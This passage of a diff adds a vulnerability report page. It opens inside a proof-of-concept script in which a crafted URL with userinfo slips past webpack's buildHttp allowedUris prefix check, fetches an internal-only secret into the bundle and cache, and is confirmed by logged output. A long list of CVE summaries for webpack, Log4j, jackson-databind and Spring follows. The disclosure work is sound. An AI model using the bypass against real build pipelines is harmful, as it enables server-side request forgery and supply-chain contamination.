+console.log(&#34;LEAKED_SECRET:&#34;, secret);
+export default secret;
+`
+  );
+
+  const config = {
+    context: tmp,
+    mode: &#34;development&#34;,
+    entry: &#34;./src/index.js&#34;,
+    output: { path: distDir, filename: &#34;bundle.js&#34; },
+    experiments: {
+      buildHttp: {
+        allowedUris: [allowedUri],
+        cacheLocation: cacheDir,
+        lockfileLocation: lockfile,
+        upgrade: true
+      }
+    }
+  };
+
+  console.log(&#34;\n[ENV]&#34;);
+  console.log(`- webpack version: ${webpackVersion}`);
+  console.log(`- node version:    ${process.version}`);
+  console.log(`- allowedUris:     ${JSON.stringify([allowedUri])}`);
+
+  console.log(&#34;\n[CRAFTED URL]&#34;);
+  console.log(`- import specifier: ${crafted}`);
+  console.log(`- WHAT startsWith() sees: begins with &#34;${allowedUri}&#34; =&gt; ${fmtBool(crafted.startsWith(allowedUri))}`);
+  console.log(`- WHAT URL() parses:`);
+  console.log(`  - username: ${JSON.stringify(parsed.username)} (userinfo)`);
+  console.log(`  - password: ${JSON.stringify(parsed.password)} (userinfo)`);
+  console.log(`  - hostname: ${parsed.hostname}`);
+  console.log(`  - port:     ${parsed.port}`);
+  console.log(`  - origin:   ${parsed.origin}`);
+  console.log(`  - NOTE: request goes to origin above (host/port after @), not to &#34;${allowedUri}&#34;`);
+
+  const compiler = webpack(config);
+
+  compiler.run(async (err, stats) =&gt; {
+    try {
+      if (err) throw err;
+      const info = stats.toJson({ all: false, errors: true, warnings: true });
+
+      if (stats.hasErrors()) {
+        console.error(&#34;\n[WEBPACK ERRORS]&#34;);
+        console.error(info.errors);
+        process.exitCode = 1;
+        return;
+      }
+
+      const bundle = await fs.readFile(bundlePath, &#34;utf8&#34;);
+      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);
+      const foundSecret = m ? m[0] : null;
+
+      console.log(&#34;\n[RESULT]&#34;);
+      console.log(`- temp dir:  ${tmp}`);
+      console.log(`- bundle:    ${bundlePath}`);
+      console.log(`- lockfile:  ${lockfile}`);
+      console.log(`- cacheDir:  ${cacheDir}`);
+
+      console.log(&#34;\n[SECURITY CHECK]&#34;);
+      console.log(`- bundle contains INTERNAL_ONLY_SECRET_* : ${fmtBool(!!foundSecret)}`);
+
+      if (foundSecret) {
+        const lockHit = await fileContains(lockfile, foundSecret);
+
+        const cacheFiles = await walk(cacheDir);
+        let cacheHit = false;
+        for (const f of cacheFiles) {
+          if (await fileContains(f, foundSecret)) { cacheHit = true; break; }
+        }
+
+        console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);
+        console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);
+      }
+    } catch (e) {
+      console.error(e);
+      process.exitCode = 1;
+    } finally {
+      compiler.close(() =&gt; {});
+    }
+  });
+})();
+```
+
+
+#### 4) Run
+Terminal A:
+```bash
+node server.js
+```
+
+Terminal B:
+```bash
+node attacker.js
+```
+
+#### 5) Expected vs Actual
+
+Expected: The import should be blocked because the effective request destination is http://127.0.0.1:9100/secret.js, which is outside allowedUris (only http://127.0.0.1:9000 is allow-listed).
+
+Actual: The crafted URL passes the allow-list prefix validation, webpack fetches the internal-only resource on port 9100 (confirmed by server logs), and the secret marker appears in the bundle and buildHttp cache.
+
+### Impact
+
+Vulnerability class: Policy/allow-list bypass leading to build-time SSRF behavior and untrusted content inclusion in build outputs.
+
+Who is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary. If an attacker can influence the imported HTTP(S) specifier (e.g., via source contribution, dependency manipulation, or configuration), they can cause outbound requests from the build environment to endpoints outside the allow-list (including internal-only services, subject to network reachability). The fetched response can be treated as module source and included in build outputs and persisted in the buildHttp cache, increasing the risk of leakage or supply-chain contamination.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2023-28154</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> webpack
+					</div>
+					<div class="vuln-description">
+						Cross-realm object access in Webpack 5. Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-45046</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.apache.logging.log4j:log4j-core
+					</div>
+					<div class="vuln-description">
+						Incomplete fix for Apache Log4j vulnerability. # Impact
+
+The fix to address [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allow attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a remote code execution (RCE) attack. 
+
+## Affected packages
+Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.
+
+# Mitigation
+
+Log4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (&lt; 2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).
+
+Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default. Note that previous mitigations involving configuration such as to set the system property `log4j2.formatMsgNoLookups` to `true` do NOT mitigate this specific vulnerability.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-45105</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.apache.logging.log4j:log4j-core
+					</div>
+					<div class="vuln-description">
+						Apache Log4j2 vulnerable to Improper Input Validation and Uncontrolled Recursion. Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Thread Context Map data to cause a denial of service when a crafted string is interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.
+
+
+# Affected packages
+Only the `org.apache.logging.log4j:log4j-core` package is directly affected by this vulnerability. The `org.apache.logging.log4j:log4j-api` should be kept at the same version as the `org.apache.logging.log4j:log4j-core` package to ensure compatability if in use.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-9488</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.apache.logging.log4j:log4j-core
+					</div>
+					<div class="vuln-description">
+						Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. Improper validation of certificate with host mismatch in Apache Log4j SMTP appender prior to version 2.13.2. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messages sent through that appender.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-36518</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Deeply nested json in jackson-databind. jackson-databind is a data-binding package for the Jackson Data Processor. jackson-databind allows a Java stack overflow exception and denial of service via a large depth of nested objects.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-20190</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Deserialization of untrusted data in jackson-databind. A flaw was found in jackson-databind before 2.9.10.7 and 2.6.7.5. FasterXML mishandles the interaction between serialization gadgets and typing. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-14379</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Deserialization of untrusted data in FasterXML jackson-databind. SubTypeValidator.java in FasterXML jackson-databind before 2.9.9.2, 2.8.11.4, and 2.7.9.6 mishandles default typing when ehcache is used (because of net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup), leading to remote code execution.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-16335</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Polymorphic Typing issue in FasterXML jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10, 2.8.11.5, and 2.6.7.3. It is related to com.zaxxer.hikari.HikariDataSource. This is a different vulnerability than CVE-2019-14540.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-14892</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Polymorphic deserialization of malicious object in jackson-databind. A flaw was discovered in jackson-databind in versions before 2.9.10, 2.8.11.5, and 2.6.7.3, where it would permit polymorphic deserialization of a malicious object using commons-configuration 1 and 2 JNDI classes. An attacker could use this flaw to execute arbitrary code.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2018-7489</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						FasterXML jackson-databind allows unauthenticated remote code execution . FasterXML jackson-databind before before 2.6.7.5, 2.7.x before 2.7.9.3, 2.8.x before 2.8.11.1, and 2.9.x before 2.9.5 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the c3p0 libraries are available in the classpath.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2018-12022</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						jackson-databind Deserialization of Untrusted Data vulnerability. An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Jodd-db jar (for database access for the Jodd framework) in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-17267</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Improper Input Validation in jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10 and 2.8.11.5. It is related to net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-16943</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						jackson-databind polymorphic typing issue. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 prior to 2.9.10.1, 2.8.11.5, and 2.6.7.3. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the p6spy (3.8.6) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of com.p6spy.engine.spy.P6DataSource mishandling.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-17531</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						jackson-databind polymorphic typing issue. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 prior to 2.9.10.1, 2.8.11.5, and 2.6.7.3. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the apache-log4j-extra (version 1.2.x) jar in the classpath, and an attacker can provide a JNDI service to access, it is possible to make the service execute a malicious payload. 
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-14439</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Deserialization of untrusted data in FasterXML jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9.2, 2.8.11.4, 2.7.9.6, and 2.6.7.3. This occurs when Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the logback jar in the classpath.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2019-14540</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Polymorphic Typing issue in FasterXML jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10, 2.8.11.5, and 2.6.7.3. It is related to `com.zaxxer.hikari.HikariConfig`.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2017-7525</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						jackson-databind is vulnerable to a deserialization flaw. A deserialization flaw was discovered in the jackson-databind, versions before 2.6.7.1, 2.7.9.1 and 2.8.9, which could allow an unauthenticated user to perform code execution by sending the maliciously crafted input to the readValue method of the ObjectMapper.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2017-17485</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						jackson-databind vulnerable to remote code execution due to incorrect deserialization and blocklist bypass. FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2022-42004</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Uncontrolled Resource Consumption in FasterXML jackson-databind. In FasterXML jackson-databind before 2.12.7.1 and in 2.13.x before 2.13.4, resource exhaustion can occur because of a lack of a check in BeanDeserializer._deserializeFromArray to prevent use of deeply nested arrays. This issue can only happen when the `UNWRAP_SINGLE_VALUE_ARRAYS` feature is explicitly enabled.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-10650</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						jackson-databind vulnerable to unsafe deserialization. The com.fasterxml.jackson.core:jackson-databind library before version 2.9.10.4 is vulnerable to an Unsafe Deserialization vulnerability when handling interactions related to the class `ignite-jta`.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-36189</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Unsafe Deserialization in jackson-databind. FasterXML jackson-databind 2.x before 2.9.10.8 an 2.6.7.5 mishandles the interaction between serialization gadgets and typing, related to com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2018-5968</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> com.fasterxml.jackson.core:jackson-databind
+					</div>
+					<div class="vuln-description">
+						Deserialization of Untrusted Data in jackson-databind. FasterXML jackson-databind through 2.8.11 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 and CVE-2017-17485 deserialization flaws. This is exploitable via two different gadgets that bypass a blacklist.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-38809</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Spring Framework DoS via conditional HTTP request. ### Description
+Applications that parse ETags from `If-Match` or `If-None-Match` request headers are vulnerable to DoS attack.
+
+### Affected Spring Products and Versions
+org.springframework:spring-web in versions 
+
+6.1.0 through 6.1.11
+6.0.0 through 6.0.22
+5.3.0 through 5.3.37
+
+Older, unsupported versions are also affected
+
+### Mitigation
+Users of affected versions should upgrade to the corresponding fixed version.
+6.1.x -&gt; 6.1.12
+6.0.x -&gt; 6.0.23
+5.3.x -&gt; 5.3.38
+No other mitigation steps are necessary.
+
+Users of older, unsupported versions could enforce a size limit on `If-Match` and `If-None-Match` headers, e.g. through a Filter.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-22262</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 6.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Spring Framework URL Parsing with Host Validation. Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.
+
+This is the same as  CVE-2024-22259 https://spring.io/security/cve-2024-22259  and  CVE-2024-22243 https://spring.io/security/cve-2024-22243 , but with different input.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-38820</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Spring Framework DataBinder Case Sensitive Match Exception. The fix for CVE-2022-22968 made disallowedFields patterns in DataBinder case insensitive. However, String.toLowerCase() has some Locale dependent exceptions that could potentially result in fields not protected as expected.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2016-1000027</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Pivotal Spring Framework contains unsafe Java deserialization methods. Pivotal Spring Framework before 6.0.0 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required.
+
+Maintainers recommend investigating alternative components or a potential mitigating control. Version 4.2.6 and 3.2.17 contain [enhanced documentation](https://github.com/spring-projects/spring-framework/commit/5cbe90b2cd91b866a5a9586e460f311860e11cfa) advising users to take precautions against unsafe Java deserialization, version 5.3.0 [deprecate the impacted classes](https://github.com/spring-projects/spring-framework/issues/25379) and version 6.0.0 [removed it entirely](https://github.com/spring-projects/spring-framework/issues/27422).
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2015-3192</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Pivotal Spring Framework DoS Attack with XML Input. Pivotal Spring Framework before 3.2.14 and 4.x before 4.1.7 do not properly process inline DTD declarations when DTD is not entirely disabled, which allows remote attackers to cause a denial of service (memory consumption and out-of-memory errors) via a crafted XML file.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-22243</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 6.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Spring Web vulnerable to Open Redirect or Server Side Request Forgery. Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect attack or to a SSRF attack if the URL is used after passing validation checks.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2013-6429</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 5.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Cross-Site Request Forgery in Spring Framework. The SourceHttpMessageConverter in Spring MVC in Spring Framework before 3.2.5 and 4.0.0.M1 through 4.0.0.RC1 does not disable external entity resolution, which allows remote attackers to read arbitrary files, cause a denial of service, and conduct CSRF attacks via crafted XML, aka an XML External Entity (XXE) issue, and a different vulnerability than CVE-2013-4152 and CVE-2013-7315.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2024-22259</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 6.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Spring Framework URL Parsing with Host Validation Vulnerability. Applications that use UriComponentsBuilder in Spring Framework to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.
+
+This is the same as  CVE-2024-22243 https://spring.io/security/cve-2024-22243, but with different input.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2013-6430</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> org.springframework:spring-web
+					</div>
+					<div class="vuln-description">
+						Improper Neutralization of Input During Web Page Generation in Spring Framework. The JavaScriptUtils.javaScriptEscape method in web/util/JavaScriptUtils.java in Spring MVC in Spring Framework before 3.2.2 does not properly escape certain characters, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a (1) line separator or (2) paragraph separator Unicode character or (3) left or (4) right angle bracket.
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2015-6420</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> commons-collections:commons-collections
+					</div>
+					<div class="vuln-description">
+						Insecure Deserialization in Apache Commons Collection. Serialized-object interfaces in Java applications using the Apache Commons Collections (ACC) library may allow remote attackers to execute arbitrary commands via a crafted serialized Java object.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2015-7501</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> commons-collections:commons-collections
+					</div>
+					<div class="vuln-description">
+						Deserialization of Untrusted Data in Apache commons collections. It was found that the Apache commons-collections library permitted code execution when deserializing objects involving a specially constructed chain of classes. A remote attacker could use this flaw to execute arbitrary code with the permissions of the application using the commons-collections library.
+					</div>
+				</div>
+				
